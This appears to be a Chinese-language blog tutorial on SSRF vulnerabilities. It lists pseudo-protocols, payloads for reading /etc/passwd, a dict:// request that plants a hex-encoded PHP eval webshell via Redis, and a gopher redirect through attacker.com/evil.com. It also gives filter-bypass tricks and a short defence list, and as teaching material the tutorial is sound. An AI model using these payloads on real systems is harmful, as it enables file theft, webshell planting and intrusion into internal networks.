---
data: 2024-07-04
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18284880
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/SSRF/SSRF|SSRF]]"
title: SSRF漏洞初识
---
## 基本原理
SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证.SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

![](https://cdn.nlark.com/yuque/0/2024/png/27874700/1719670597509-7def24fc-8837-4267-91a6-a8e8f2559fae.png)


## SSRF中的伪协议

~~~
file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议

dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
gopher:// 分布式文档传递服务，可使用gopherus生成payload
~~~

## 攻击方式Playload
### 文件读取

```
file:///etc/passwd
ftp://username:password@hostname/filepath
```
### 命令读取
#### dict
我们要爆破出对应的端口和口令,然后后面就是类似于redis的未授权的东西了
```
url=dict://192.168.124.153:6380/config:set:dir:/var/www/html

利用16进制写入shell
GET /ssrf/ssrf.php?url=dict://192.168.124.153:6380/set:webshell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x20\x3f\x3e"
```
#### gopher://
Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

~~~
http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-<?php header(‘Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest’);?>
~~~
## 绕过

### 限制域名

#### http基本身份认证(@符号)
~~~
如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。

如 http://www.baidu.com@10.10.10.10与http://10.10.10.10地址是相同
~~~

#### **短网址绕过**
~~~
比如百度短地址https://dwz.cn/
~~~

#### **进制转换**

~~~
127.0.0.1
八进制：0177.0.0.1。
十六进制：0x7f.0.0.1。
十进制：2130706433.
~~~

#### **利用特殊域名**
~~~
原理是DNS解析。**xip.io**可以指向任意域名，即  
127.0.0.1.xip.io，可解析为127.0.0.1  
(xip.io 现在好像用不了了，可以找找其他的)
~~~
#### 用[::]绕过

~~~
可以利用[::]来绕过localhost  
http://169.254.169.254>>http://[::169.254.169.254]
~~~
#### 句号使用

~~~
127。0。0。1 >>> 127.0.0.1
~~~
#### CRLF 编码绕过
~~~
example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a
~~~

#### 302协议跳转
这个就要结合实际的一个业务逻辑来进行处理，有302跳转功能。
```
curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'
```

#### 使用非http协议
```
file://
dict://  
sftp://  
ftp://  
tftp://  
ldap://  
gopher://
```

#### Enclosed alphanumerics绕过
```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com  
List:  
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
## 防御

1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。